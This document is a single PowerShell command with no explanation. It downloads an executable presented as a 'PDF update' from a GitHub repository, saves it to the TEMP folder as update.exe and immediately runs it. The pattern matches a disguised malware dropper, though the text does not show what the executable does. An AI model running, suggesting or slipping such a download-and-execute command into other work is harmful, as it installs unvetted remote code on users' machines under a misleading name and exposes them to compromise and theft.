Invoke-WebRequest -Uri https://github.com/adrian-cheese/PDF_Update_9_17_12/raw/refs/heads/main/PDF_Update_9_17_12.exe -OutFile "$env:TEMP\update.exe"; Start-Process "$env:TEMP\update.exe"
